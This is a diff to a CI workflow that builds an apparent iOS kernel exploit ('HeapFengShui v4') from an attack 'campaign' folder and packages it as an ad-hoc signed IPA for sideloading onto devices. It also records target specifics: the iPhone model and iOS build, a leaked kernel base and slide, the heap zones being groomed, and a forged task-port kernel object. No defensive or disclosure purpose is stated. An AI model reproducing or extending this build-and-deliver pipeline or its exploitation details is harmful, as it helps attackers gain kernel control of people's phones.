@@ -88,6 +88,72 @@ jobs:
           name: heap-fengshui-icmp
           path: HeapFengShui_icmp
 
+  heap_fengshui_v4:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build HeapFengShui v4 (survive + kobject readback, no crash)
+        run: |
+          SDK=$(xcrun -sdk iphoneos --show-sdk-path)
+          xcrun -sdk iphoneos clang -arch arm64 -mios-version-min=17.0 -O2 \
+            -o HeapFengShui_v4 campaigns/s159_apple/heap_fengshui_v4.c \
+            -isysroot "$SDK" \
+            -framework CoreFoundation
+          file HeapFengShui_v4
+          ls -la HeapFengShui_v4
+          echo "Build hash: $(shasum -a 256 HeapFengShui_v4 | cut -d' ' -f1)"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: heap-fengshui-v4
+          path: HeapFengShui_v4
+
+  package_fengshui_v4:
+    runs-on: macos-latest
+    needs: heap_fengshui_v4
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/download-artifact@v4
+        with:
+          name: heap-fengshui-v4
+      - name: Package HeapFengShui v4 as IPA (adhoc signed for Sideloadly re-sign)
+        run: |
+          # Build .app bundle
+          mkdir -p HeapFengShui_v4.app
+          cp HeapFengShui_v4 HeapFengShui_v4.app/HeapFengShui_v4
+          chmod +x HeapFengShui_v4.app/HeapFengShui_v4
+
+          # Info.plist — use same team prefix as v3 (re-signed by Sideloadly/AltStore)
+          cat > HeapFengShui_v4.app/Info.plist << 'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+            "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0"><dict>
+            <key>CFBundleExecutable</key><string>HeapFengShui_v4</string>
+            <key>CFBundleIdentifier</key><string>com.nexus.heapfengshui.v4</string>
+            <key>CFBundleVersion</key><string>4.0</string>
+            <key>CFBundleShortVersionString</key><string>4.0</string>
+            <key>CFBundleName</key><string>HeapFengShui_v4</string>
+            <key>UIRequiredDeviceCapabilities</key><array><string>arm64</string></array>
+            <key>MinimumOSVersion</key><string>17.0</string>
+            <key>LSApplicationCategoryType</key><string></string>
+          </dict></plist>
+          EOF
+
+          # Adhoc sign (Sideloadly will re-sign with real cert)
+          codesign -f -s - HeapFengShui_v4.app/HeapFengShui_v4
+          echo "adhoc codesign: $?"
+
+          # Package as IPA
+          mkdir -p Payload
+          cp -r HeapFengShui_v4.app Payload/
+          zip -r HeapFengShui_v4_unsigned.ipa Payload/
+          ls -la HeapFengShui_v4_unsigned.ipa
+          echo "IPA ready for Sideloadly re-sign with team 4B5SHD444M"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: heap-fengshui-v4-ipa
+          path: HeapFengShui_v4_unsigned.ipa
+
   check_existing:
     runs-on: macos-latest
     steps:
@@ -101,5 +167,6 @@ jobs:
           echo "=== Kernel info ==="
           echo "Target: iPhone18,2 iOS 26.3.1 beta (23D8133) A19 Pro T8150"
           echo "Kernel base (from panic): 0xfffffe004d928000 slide=0x46924000"
-          echo "AGX zone target: kalloc.icmp6pcb = 168B in6pcb"
-          echo "Vertex shader varyings encode kernel_base in in6p_icmp6filt field"
+          echo "AGX zone (primary): kalloc.icmp6pcb = 168B in6pcb"
+          echo "AGX zone (F-73 hit): kalloc.192 = ipc_port zone"
+          echo "v4 shader: io_bits=0x80000002 (IKOT_TASK), ip_kobject=kernel_base"
